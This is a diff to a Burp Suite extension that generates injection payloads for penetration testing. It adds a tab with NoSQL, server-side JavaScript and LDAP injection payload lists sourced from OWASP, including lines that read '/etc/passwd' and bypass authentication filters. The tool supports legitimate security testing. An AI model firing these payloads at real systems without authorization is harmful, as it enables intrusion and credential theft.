@@ -1,9 +1,9 @@
 __author__ = 'Jake Miller (@LaconicWolf)'
-__date__ = '20190320'
-__version__ = '0.01'
+__date__ = '20190404'
+__version__ = '0.02'
 __description__ = """\
 Burp Extension that generates payloads for 
-XSS, SQLi, and Header injection vulns.
+XSS, SQLi, Header injection, and a few other vulns.
 """
 
 from burp import IBurpExtender, ITab
@@ -61,7 +61,7 @@ xssConfig = {
     "Toggle case": False,
     "Upper case": False,
     "HTML encode special chars": False,
-    "Append random chars": False,
+    "Prepend random chars": False,
     "Non-standard percent encoding": False,
     "Non-standard slash encoding": False,
     "Close tags": False
@@ -128,6 +128,26 @@ headersConfig = {
     "Non-standard slash encoding": False
 }
 
+otherVulnsToTest = {
+    'NoSQLi': False,
+    'LDAP Injection': False, 
+    'JavaScript Injection': False,
+    'General Fuzzing': False,  
+}
+
+otherVulnsConfig = {
+    "URL encode special chars": False,
+    "Replace () with ``": False,
+    "Toggle case": False,
+    "Upper case": False,
+    "HTML encode special chars": False,
+    "Prepend random chars": False,
+    "Non-standard percent encoding": False,
+    "Non-standard slash encoding": False,
+    "Close tags": False
+}
+
+
 # Interact with Burp. Required
 class BurpExtender(IBurpExtender, ITab, swing.JFrame):
     def registerExtenderCallbacks(self, callbacks):
@@ -155,9 +175,9 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         # Subtabs
 
         # First tab ############ START XSS TAB ############
-        firstTab = swing.JPanel()
-        firstTab.layout = BorderLayout()
-        tabbedPane.addTab("XSS", firstTab)
+        xssTab = swing.JPanel()
+        xssTab.layout = BorderLayout()
+        tabbedPane.addTab("XSS", xssTab)
 
         tmpGridPanel = swing.JPanel()
         tmpGridPanel.layout = GridLayout(1, 2)
@@ -220,10 +240,9 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         self.xssCustomHandler3Area = swing.JTextField('', 15)
         tmpPanel1.add(self.xssCustomHandler3Area)
 
-        #firstTab.add(tmpPanel, BorderLayout.NORTH)
         tmpGridPanel.add(tmpPanel)
         tmpGridPanel.add(tmpPanel1)
-        firstTab.add(tmpGridPanel, BorderLayout.NORTH)
+        xssTab.add(tmpGridPanel, BorderLayout.NORTH)
 
         # Middle of XSS Panel
         tmpPanel = swing.JPanel()
@@ -233,7 +252,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         self.xssPayloadTextArea.setLineWrap(False)
         scrollTextArea = swing.JScrollPane(self.xssPayloadTextArea)
         tmpPanel.add(scrollTextArea)
-        firstTab.add(tmpPanel, BorderLayout.CENTER)
+        xssTab.add(tmpPanel, BorderLayout.CENTER)
 
         # Right/Middle of XSS Panel
         tmpPanel = swing.JPanel()
@@ -245,7 +264,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleXssButtonClick))
         tmpPanel.add(swing.JLabel(""))
         tmpPanel.add(swing.JLabel(""))
-        firstTab.add(tmpPanel, BorderLayout.EAST)
+        xssTab.add(tmpPanel, BorderLayout.EAST)
 
         # Bottom of XSS Panel
         tmpPanel = swing.JPanel()
@@ -254,7 +273,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
 
         # First row
         tmpPanel.add(swing.JCheckBox("Upper case", False, actionPerformed=self.handleXssConfigCheckBox))
-        tmpPanel.add(swing.JCheckBox("Append random chars", False, actionPerformed=self.handleXssConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("Prepend random chars", False, actionPerformed=self.handleXssConfigCheckBox))
         tmpPanel.add(swing.JCheckBox("Replace () with ``", False, actionPerformed=self.handleXssConfigCheckBox))
         tmpPanel.add(swing.JLabel("Add a prefix :     ", swing.SwingConstants.RIGHT))
         self.xssPrefixArea = swing.JTextField('', 15)
@@ -276,14 +295,14 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         self.xssTagTextArea = swing.JTextField('', 15)
         tmpPanel.add(self.xssTagTextArea)   
         
-        firstTab.add(tmpPanel, BorderLayout.SOUTH)
+        xssTab.add(tmpPanel, BorderLayout.SOUTH)
         ############ END XSS TAB ############
 
         # Second tab 
         ############ START SQLi TAB ############
-        secondTab = swing.JPanel()
-        secondTab.layout = BorderLayout()
-        tabbedPane.addTab("SQLi", secondTab)
+        sqliTab = swing.JPanel()
+        sqliTab.layout = BorderLayout()
+        tabbedPane.addTab("SQLi", sqliTab)
 
         tmpGridPanel = swing.JPanel()
         tmpGridPanel.layout = GridLayout(1, 2)
@@ -335,10 +354,9 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         tmpPanel1.add(swing.JLabel(""))
         tmpPanel1.add(swing.JLabel(""))
 
-        #firstTab.add(tmpPanel, BorderLayout.NORTH)
         tmpGridPanel.add(tmpPanel)
         tmpGridPanel.add(tmpPanel1)
-        secondTab.add(tmpGridPanel, BorderLayout.NORTH)
+        sqliTab.add(tmpGridPanel, BorderLayout.NORTH)
 
         # Middle of SQLi Panel
         tmpPanel = swing.JPanel()
@@ -348,7 +366,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         self.sqliPayloadTextArea.setLineWrap(False)
         scrollTextArea = swing.JScrollPane(self.sqliPayloadTextArea)
         tmpPanel.add(scrollTextArea)
-        secondTab.add(tmpPanel, BorderLayout.CENTER)
+        sqliTab.add(tmpPanel, BorderLayout.CENTER)
 
         # Right/Middle of SQLi Panel
         tmpPanel = swing.JPanel()
@@ -360,7 +378,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleSqliButtonClick))
         tmpPanel.add(swing.JLabel(""))
         tmpPanel.add(swing.JLabel(""))
-        secondTab.add(tmpPanel, BorderLayout.EAST)
+        sqliTab.add(tmpPanel, BorderLayout.EAST)
 
         # Bottom of SQLi Panel
         tmpPanel = swing.JPanel()
@@ -391,14 +409,14 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         self.sqliOriginalParamArea = swing.JTextField("", 15)  
         tmpPanel.add(self.sqliOriginalParamArea)
 
-        secondTab.add(tmpPanel, BorderLayout.SOUTH)
+        sqliTab.add(tmpPanel, BorderLayout.SOUTH)
         ############ END SQLi TAB ############
 
         ############ START HEADERS TAB ############
         # Third tab 
-        thirdTab = swing.JPanel()
-        thirdTab.layout = BorderLayout()
-        tabbedPane.addTab("Headers", thirdTab)
+        headersTab = swing.JPanel()
+        headersTab.layout = BorderLayout()
+        tabbedPane.addTab("Headers", headersTab)
 
         # Top of Headers Panel
         tmpPanel = swing.JPanel()
@@ -432,7 +450,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         self.customHeader3Area = swing.JTextField("", 15)  
         tmpPanel.add(self.customHeader3Area)
         
-        thirdTab.add(tmpPanel, BorderLayout.NORTH)
+        headersTab.add(tmpPanel, BorderLayout.NORTH)
 
         # Middle of Headers Panel
         tmpPanel = swing.JPanel()
@@ -442,7 +460,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         self.headerPayloadTextArea.setLineWrap(False)
         scrollTextArea = swing.JScrollPane(self.headerPayloadTextArea)
         tmpPanel.add(scrollTextArea)
-        thirdTab.add(tmpPanel, BorderLayout.CENTER)
+        headersTab.add(tmpPanel, BorderLayout.CENTER)
 
         # Right/Middle of Headers Panel
         tmpPanel = swing.JPanel()
@@ -454,7 +472,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleHeadersButtonClick))
         tmpPanel.add(swing.JButton('Poll Collaborator Server', actionPerformed=self.handleHeadersButtonClick))
         tmpPanel.add(swing.JLabel(""))
-        thirdTab.add(tmpPanel, BorderLayout.EAST)
+        headersTab.add(tmpPanel, BorderLayout.EAST)
 
         # Bottom of Headers Panel
         
@@ -508,16 +526,95 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         tmpGridPanel.add(tmpPanel)
         tmpGridPanel.add(tmpPanel1)
         
-        thirdTab.add(tmpGridPanel, BorderLayout.SOUTH)
+        headersTab.add(tmpGridPanel, BorderLayout.SOUTH)
         ############ END HEADERS TAB ############
 
-        ### Originally had 7 tabs...Got rid of 4, 5, and 6. ###
+        ############ START OTHER TAB ############ 
+        otherTab = swing.JPanel()
+        otherTab.layout = BorderLayout()
+        tabbedPane.addTab("Other", otherTab)
+
+        # Top of Headers Panel
+        tmpPanel = swing.JPanel()
+        tmpPanel.layout = GridLayout(3, 5)
+        tmpPanel.border = swing.BorderFactory.createTitledBorder("Vulnerabilities")
+        
+        # First row
+        tmpPanel.add(swing.JCheckBox("NoSQLi", False, actionPerformed=self.handleOtherSelectCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        
+        # Will add more payloads in future releases
+
+        # Second row
+        tmpPanel.add(swing.JCheckBox("JavaScript Injection", False, actionPerformed=self.handleOtherSelectCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        
+        # Third row
+        tmpPanel.add(swing.JCheckBox("LDAP Injection", False, actionPerformed=self.handleOtherSelectCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        
+        otherTab.add(tmpPanel, BorderLayout.NORTH)
+
+        # Middle of Headers Panel
+        tmpPanel = swing.JPanel()
+        tmpPanel.layout = BorderLayout()
+        tmpPanel.border = swing.BorderFactory.createTitledBorder("Payloads")
+        self.otherPayloadTextArea = swing.JTextArea('', 15, 100)
+        self.otherPayloadTextArea.setLineWrap(False)
+        scrollTextArea = swing.JScrollPane(self.otherPayloadTextArea)
+        tmpPanel.add(scrollTextArea)
+        otherTab.add(tmpPanel, BorderLayout.CENTER)
+
+        # Right/Middle of XSS Panel
+        tmpPanel = swing.JPanel()
+        tmpPanel.layout = GridLayout(6,1)
+        tmpPanel.border = swing.BorderFactory.createTitledBorder("Output options")
+        tmpPanel.add(swing.JButton('Generate Payloads', actionPerformed=self.handleOtherButtonClick))
+        tmpPanel.add(swing.JButton('Copy Payloads to Clipboard', actionPerformed=self.handleOtherButtonClick))
+        tmpPanel.add(swing.JButton('Clear Payloads', actionPerformed=self.handleOtherButtonClick))
+        tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleOtherButtonClick))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        otherTab.add(tmpPanel, BorderLayout.EAST)
+
+        # Bottom of XSS Panel
+        tmpPanel = swing.JPanel()
+        tmpPanel.layout = GridLayout(3, 5)
+        tmpPanel.border = swing.BorderFactory.createTitledBorder("Config")
+
+        # First row
+        tmpPanel.add(swing.JCheckBox("Upper case", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("Prepend random chars", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("HTML encode special chars", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JLabel("Add a prefix :     ", swing.SwingConstants.RIGHT))
+        self.otherPrefixArea = swing.JTextField('', 15)
+        tmpPanel.add(self.otherPrefixArea)
+        
+        # Second row
+        tmpPanel.add(swing.JCheckBox("URL encode special chars", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("Toggle case", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel("Add a suffix :     ", swing.SwingConstants.RIGHT))
+        self.otherSuffixArea = swing.JTextField("", 15)
+        tmpPanel.add(self.otherSuffixArea)
+
+        # Third row
+        tmpPanel.add(swing.JCheckBox("Non-standard percent encoding", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("Non-standard slash encoding", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        
+        otherTab.add(tmpPanel, BorderLayout.SOUTH)
+        ############ END OTHER TAB ############
 
         ####START COLLABORATOR INTERACTIONS TAB####
         # Seventh tab
-        seventhTab = swing.JPanel()
-        seventhTab.layout = BorderLayout()
-        tabbedPane.addTab("Collaborator Log", seventhTab)
+        collabTab = swing.JPanel()
+        collabTab.layout = BorderLayout()
+        tabbedPane.addTab("Collaborator Log", collabTab)
 
         # Text area for Collaborator Interactions Panel
         tmpPanel = swing.JPanel()
@@ -527,7 +624,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         self.collaboratorInteractionsTextArea.setLineWrap(False)
         scrollTextArea = swing.JScrollPane(self.collaboratorInteractionsTextArea)
         tmpPanel.add(scrollTextArea)
-        seventhTab.add(tmpPanel, BorderLayout.CENTER)
+        collabTab.add(tmpPanel, BorderLayout.CENTER)
 
         # Right/Middle of Collaborator Interactions Panel
         tmpPanel = swing.JPanel()
@@ -541,7 +638,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         tmpPanel.add(swing.JLabel(""))
         tmpPanel.add(swing.JLabel(""))
         tmpPanel.add(swing.JLabel(""))
-        seventhTab.add(tmpPanel, BorderLayout.EAST)
+        collabTab.add(tmpPanel, BorderLayout.EAST)
         #####END COLLABORATOR INTERACTIONS TAB#####
 
         callbacks.addSuiteTab(self)
@@ -694,7 +791,7 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
             payloads = [self.xssPrefixArea.text + payload for payload in payloads]
         if self.xssSuffixArea.text:
             payloads = [payload + self.xssSuffixArea.text for payload in payloads]
-        if xssConfig['Append random chars']:
+        if xssConfig['Prepend random chars']:
             payloads = [getRandomString(5) + payload for payload in payloads]
         if xssConfig['Non-standard percent encoding']:
             payloads = [percentNonStandardEncode(payload) for payload in payloads]
@@ -885,6 +982,89 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
 
         self.headerPayloadTextArea.text = '\n'.join(payloads)
 
+    def handleOtherSelectCheckBox(self, event):
+        """Handles checkbox clicks from the Headers menu 
+        header selection to ensure only payloads for 
+        specified headers are generated.
+        """
+        if event.source.selected:
+            otherVulnsToTest[event.source.text] = True
+        else:
+            otherVulnsToTest[event.source.text] = False
+
+    def handleOtherConfigCheckBox(self, event):
+        """Handles checkbox clicks from the Other's menu config 
+        selection to ensure only payloads are generated with 
+        or without any specified options.
+        """
+        if event.source.selected:
+            otherVulnsConfig[event.source.text] = True
+        else:
+            otherVulnsConfig[event.source.text] = False
+
+    def handleOtherTestsCheckBox(self, event):
+        """Handles checkbox clicks from the Other tab Tests 
+        selection to ensure only payloads are generated with 
+        or without any specified options.
+        """
+        if event.source.selected:
+            otherVulnsTests[event.source.text] = True
+        else:
+            otherVulns[event.source.text] = False
+
+    def handleOtherButtonClick(self, event):
+        """Handles button clicks from Other menu."""
+        buttonText = event.source.text
+        if buttonText == "Generate Payloads":
+            self.launchThread(self.generateOtherPayloads())
+        elif buttonText == "Copy Payloads to Clipboard":
+            self.copyToClipboard(self.otherPayloadTextArea.text)
+        elif buttonText == 'Clear Payloads':
+            self.clearTextArea(self.otherPayloadTextArea)
+        elif buttonText == "Poll Collaborator Server":
+            self.launchThread(self.pollCollabServer())            
+        elif buttonText == "Save to File":
+            self.launchThread(self.saveTextToFile, [self.otherPayloadTextArea])
+        else:
+            print buttonText
+
+    def generateOtherPayloads(self):
+        """Write payloads to the text area"""
+        payloads = []
+        vulns = [vuln for vuln in otherVulnsToTest if otherVulnsToTest[vuln]]
+        
+        for vuln in vulns:
+            if vuln == "NoSQLi":
+                noSqliPayloads = NOSQLI_PAYLOADS.split('\n')
+                payloads += noSqliPayloads
+            if vuln == "JavaScript Injection":
+                    jSPayloads = JAVASCRIPT_INJECTION_PAYLOADS.split('\n')
+                    payloads += jSPayloads
+            if vuln == "LDAP Injection":
+                    ldapPayloads = LDAP_INJECTION_PAYLOADS.split('\n')
+                    payloads += ldapPayloads
+
+        if self.otherPrefixArea.text:
+            payloads = [self.otherPrefixArea.text + payload for payload in payloads]
+        if self.otherSuffixArea.text:
+            payloads = [payload + self.otherSuffixArea.text for payload in payloads]
+        if otherVulnsConfig['Upper case']:
+            payloads = [payload.upper() for payload in payloads]
+        if otherVulnsConfig['Toggle case']:
+            payloads = [capsEveryOtherChar(payload) for payload in payloads]
+        if otherVulnsConfig['Prepend random chars']:
+            payloads = [getRandomString(5) + payload for payload in payloads]
+        if otherVulnsConfig['Non-standard percent encoding']:
+            payloads = [percentNonStandardEncode(payload) for payload in payloads]
+        if otherVulnsConfig['Non-standard slash encoding']:
+            payloads = [slashNonStandardEncode(payload) for payload in payloads]
+        if otherVulnsConfig['URL encode special chars']:
+            payloads = [urlEncode(payload) for payload in payloads]
+        if otherVulnsConfig['HTML encode special chars']:
+            payloads = [cgi.escape(payload) for payload in payloads]
+
+        self.otherPayloadTextArea.text = '\n'.join(payloads)
+
     def handleCollabButtonClick(self, event):
         """Handles button clicks from Collaborator Interactions menu."""
         buttonText = event.source.text
@@ -1005,6 +1185,99 @@ def capsEveryOtherChar(word):
         if char != ' ':
             i = not i
     return ret
+
+def getNoSqliPayloads():
+    pass
+
+# Sourced from references located at https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+NOSQLI_PAYLOADS = """\
+'
+"
+\\
+;
+{   
+}
+NaN
+==isNaN
+';return(true);var foo='bar
+';return(false);var foo='bar
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+{$gt: ''}
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+|| '1'=='1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+';return(db.getCollectionNames().length == 1);
+';return(db.getCollectionNames().length == 2);
+[$ne]=1
+[$gt]
+[$ne]
+[$in][]
+[$regex]=.*
+"""
+
+# Sourced from references located at https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+JAVASCRIPT_INJECTION_PAYLOADS = """\
+'
+"
+\\
+;
+{   
+}
+NaN
+==isNaN
+|| 1==1
+|| '1'=='1
+response.end('success')
+response.end(require('fs').readdirSync('.').toString())
+response.end(require('fs').readFileSync('/etc/passwd'))
+"""
+
+LDAP_INJECTION_PAYLOADS = """\
+(
+)
+|
+&
+*
+)(&))
+)(*)
+!
+*/*
+*|
+/
+//
+//*
+@*
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+*(|(mail=*))
+*(|(objectclass=*))
+x' or name()='username' or 'x'='y
+*()|&'
+admin*
+admin*)((|userpassword=*)
+*)(uid=*))(|(uid=*
+*()|%26'
+"""
 
 def getSqlMapPayloads():
     """Pulls in a ::: delimited string containing sqlmap payloads 
